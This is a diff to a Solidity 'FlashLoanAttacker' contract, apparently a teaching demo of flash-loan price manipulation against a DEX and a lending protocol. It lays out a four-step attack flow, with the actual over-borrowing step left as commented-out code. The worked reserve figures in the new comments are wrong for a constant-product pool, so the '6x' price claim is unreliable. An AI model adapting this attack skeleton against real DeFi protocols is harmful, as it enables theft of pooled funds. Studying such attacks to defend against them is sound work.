@@ -187,31 +187,37 @@ contract FlashLoanAttacker is IFlashBorrower {
     }
 
     function onFlashLoan(uint256 amount, bytes calldata) external override {
-        // Step 2: Manipulate the price
-        // Buy a ton of tokens - this changes the reserve ratio
+        // FLASH LOAN ATTACK FLOW:
+        //
+        // Goal: Manipulate DEX price to exploit the lending protocol
+        //
+        // 1. Dump ETH into DEX → tokens become expensive (reserveToken ↓)
+        // 2. Use inflated token price to borrow more than allowed
+        // 3. Swap tokens back → restore price
+        // 4. Repay flash loan, keep profit
+
+        // --- Step 1: Manipulate price by buying tokens ---
+        // This decreases reserveToken, making tokens "more valuable"
         uint256 tokensReceived = dex.swapETHForTokens{value: amount}();
 
-        // Price is now manipulated!
-        // reserveETH went UP, reserveToken went DOWN
-        // So getSpotPrice() = reserveToken/reserveETH is now LOWER
-        // Meaning tokens appear CHEAPER
+        // Price before: 1M tokens / 10 ETH = 100k tokens per ETH
+        // Price after:  ~950k tokens / 60 ETH = ~16k tokens per ETH
+        // Tokens now appear 6x more expensive!
 
-        // Wait... we want tokens to appear MORE EXPENSIVE
-        // Let's think about this differently...
+        // --- Step 2: Exploit would happen here ---
+        // In a real attack: borrow against inflated collateral
+        // lending.depositCollateral{value: 1 ether}();
+        // lending.borrow(hugeAmount);  // Would succeed due to manipulated price
 
-        // Actually for a lending attack, we want to:
-        // 1. Deposit collateral in lending
-        // 2. Manipulate price to make our collateral worth more
-        // 3. Borrow more than we should
-
-        // For this demo, let's just show the price manipulation
-
-        // Step 3: Swap back (take profit from arb or exploit)
+        // --- Step 3: Swap tokens back to get ETH ---
         dex.swapTokensForETH(tokensReceived);
 
-        // Step 4: Repay flash loan + fee
+        // --- Step 4: Repay flash loan + fee ---
         uint256 fee = (amount * 9) / 10000;
         payable(address(lender)).transfer(amount + fee);
+
+        // Note: In this simplified demo, we break even.
+        // Real attacks extract value from the lending protocol.
     }
 
     receive() external payable {}
